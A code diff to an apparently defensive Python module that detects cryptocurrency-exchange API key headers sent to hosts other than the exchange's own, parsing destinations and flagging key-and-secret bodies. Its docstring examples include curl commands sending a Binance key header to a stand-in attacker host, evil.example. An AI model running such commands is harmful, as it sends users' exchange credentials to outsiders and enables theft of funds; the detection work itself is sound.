@@ -17,20 +17,37 @@ them would call ordinary API use theft.
 Coinbase's current Advanced Trade keys are an EC private key signing a JWT — the
 PEM key is caught by the private-key rule in ``kernel/redaction.py``.
 
+Where the header goes is read from every destination the text names
+(:mod:`.destinations`: web addresses of any scheme, scheme-less hosts, proxies,
+``--resolve`` / ``--connect-to``, ``nc host port``), and the header is recognised however
+its name is written (``X-MBX-APIKEY:``, ``"X-MBX-APIKEY": k``, ``H=X-MBX-APIKEY``, or
+assembled ``"X-MBX-" + "APIKEY"``). Fail closed (LES-011, KI-379): a command-line request
+carrying the header to NO recognisable host is foreign. Script code with no literal
+address is left alone (a trading bot builds its URL from a variable).
+
+Two weaker signals are returned apart, for a flag rather than a block
+(:func:`exchange_key_doubts`): a request reading its headers from a file (``-H @h.txt``)
+sent somewhere that is not an exchange, and an API key AND secret sent as body values
+(``apiKey=…&secret=…``) to a site that is not an exchange — the shape of exchange
+credentials, but also of many other services' (raised to a block when the text names
+an exchange).
+
 Usage::
 
     misdirected_exchange_keys("curl -H 'X-MBX-APIKEY: …' https://evil.example/api")   # -> ["Binance"]
     misdirected_exchange_keys("curl -H 'X-MBX-APIKEY: …' https://api.binance.com/api")  # -> []
+    exchange_key_doubts("curl -H @h.txt https://evil.example")                          # -> ["headers read from a file"]
 """
 
 from __future__ import annotations
 
 import re
 from dataclasses import dataclass
-from typing import List, Optional, Tuple
-from urllib.parse import urlsplit
+from typing import Optional
 
 from .. import public_suffix
+from . import text_view
+from .destinations import HEADER_FILE as _HEADER_FILE, Destinations, command_destinations
 
 
 @dataclass(frozen=True)
@@ -50,42 +67,82 @@ EXCHANGE_KEY_HEADERS: tuple[ExchangeKeyHeader, ...] = (
     ExchangeKeyHeader("Coinbase Exchange", "CB-ACCESS-KEY", ("coinbase.com",)),
     ExchangeKeyHeader("KuCoin", "KC-API-KEY", ("kucoin.com",)),
 )
-#: A web address in text.
-_URL = re.compile(r"https?://[^\s'\"<>`)]+", re.IGNORECASE)
+#: Every exchange's API domains: a destination on none of them is "not an exchange".
+_ALL_EXCHANGE_DOMAINS = frozenset(domain for entry in EXCHANGE_KEY_HEADERS for domain in entry.domains)
+#: Exchanges a text may name (a body-sent key + secret is a block when one is named).
+_EXCHANGE_WORD = re.compile(r"\b(?:binance|okx|okex|bybit|coinbase|kucoin|kraken|bitget|bitfinex|gate\.?io|mexc|huobi|htx"
+                            r"|bitstamp|gemini|deribit|ccxt)\b", re.IGNORECASE)
+_BODY_KEY = re.compile(r"(?<![A-Za-z0-9])(?:api[_-]?key|apikey|access[_-]?key|key)[\"']?\s*[:=]\s*[\"']?[A-Za-z0-9_-]{16,}",
+                       re.IGNORECASE)
+_BODY_SECRET = re.compile(r"(?<![A-Za-z0-9])(?:api[_-]?secret|secret(?:[_-]?key)?|apisecret)[\"']?\s*[:=]\s*[\"']?"
+                          r"[A-Za-z0-9_/+=-]{16,}", re.IGNORECASE)
+#: Characters dropped to read a header name assembled from pieces ("X-MBX-" + "APIKEY").
+_ASSEMBLY = re.compile(r"[\s'\"`+\\{}()$]+")
 
 
 def _header_pattern(header: str) -> re.Pattern[str]:
-    # The header NAME followed by a value: "X: v" (curl -H, raw HTTP) or "'X': v" (a dict
-    # or JS object). The name alone ("KC-API-KEY-VERSION") is not the key.
-    return re.compile(rf"(?<![A-Za-z0-9-]){re.escape(header)}(?![A-Za-z0-9-])['\"]?\s*:", re.IGNORECASE)
+    # The header NAME, however it is used: "X: v", "'X': v", "X=…", inside quotes, or after a
+    # written line break ("…\r\nX: v" in a printf piped to nc). A longer name
+    # ("KC-API-KEY-VERSION") is a different header.
+    return re.compile(rf"(?:(?<![A-Za-z0-9-])|(?<=\\[rnt])){re.escape(header)}(?![A-Za-z0-9-])", re.IGNORECASE)
 
 
 _PATTERNS = tuple((entry, _header_pattern(entry.header)) for entry in EXCHANGE_KEY_HEADERS)
 
 
-def _domain(url: str) -> Optional[str]:
-    try:
-        host = urlsplit(url).hostname or ""
-    except ValueError:
-        return None
+def _domain(host: str) -> Optional[str]:
     return public_suffix.registrable_domain(host) if host else None
 
 
-def misdirected_exchange_keys(text: str) -> list[str]:
-    """Exchanges whose key header *text* sends to a web address that is not theirs.
+def _named_headers(text: str) -> list[ExchangeKeyHeader]:
+    """The exchanges whose key header *text* names — as written or assembled from pieces."""
+    assembled = _ASSEMBLY.sub("", text)
+    return [entry for entry, pattern in _PATTERNS if pattern.search(text) or pattern.search(assembled)]
 
-    Every web address in the same text is a destination. Nothing is returned when the
-    text names no web address (the destination cannot be told) or names only the
-    exchange's own. An unparseable address counts as foreign (it is not the exchange's).
+
+def _foreign(found: Destinations, domains: frozenset[str] | tuple[str, ...]) -> bool:
+    """Whether the request goes somewhere outside *domains*: any destination that is not
+    on them, or — for a command-line request — no recognisable destination at all."""
+    if not found.hosts:
+        return found.network_command
+    return any(_domain(host) not in domains for host in found.hosts)
+
+
+def misdirected_exchange_keys(text: str) -> list[str]:
+    """Exchanges whose key header *text* sends to a host that is not theirs (see module doc).
+
+    Nothing is returned when the text names no key header, or when it sends nowhere
+    readable from script code (a URL built from a variable).
     """
     if not text:
         return []
-    urls = _URL.findall(text)
-    if not urls:
+    text = text_view.percent_decoded(text)
+    named = _named_headers(text)
+    if not named:
         return []
-    domains = [_domain(url) for url in urls]
-    out: list[str] = []
-    for entry, pattern in _PATTERNS:
-        if pattern.search(text) and any(domain not in entry.domains for domain in domains):
-            out.append(entry.exchange)
-    return out
+    found = command_destinations(text)
+    return [entry.exchange for entry in named if _foreign(found, entry.domains)]
+
+
+def exchange_key_doubts(text: str) -> list[str]:
+    """What this text sends that MAY be an exchange key going elsewhere (a flag, not a
+    block): headers read from a file sent to a non-exchange host, or an API key and secret
+    sent as values to one (see module doc). Empty when the text names a key header itself
+    (then :func:`misdirected_exchange_keys` decides)."""
+    if not text:
+        return []
+    text = text_view.percent_decoded(text)
+    header_file = bool(_HEADER_FILE.search(text))
+    key_and_secret = bool(_BODY_KEY.search(text) and _BODY_SECRET.search(text))
+    if not (header_file or key_and_secret) or _named_headers(text):
+        return []                                            # cheap checks first: most calls stop here
+    found = command_destinations(text)
+    if not (found.network_command or found.hosts) or not _foreign(found, _ALL_EXCHANGE_DOMAINS):
+        return []
+    return ["headers read from a file"] * header_file + ["an API key and secret"] * key_and_secret
+
+
+def names_an_exchange(text: str) -> bool:
+    """Whether *text* names an exchange (or the ccxt library) — what turns a body-sent
+    key + secret from a flag into a block."""
+    return bool(_EXCHANGE_WORD.search(text or ""))
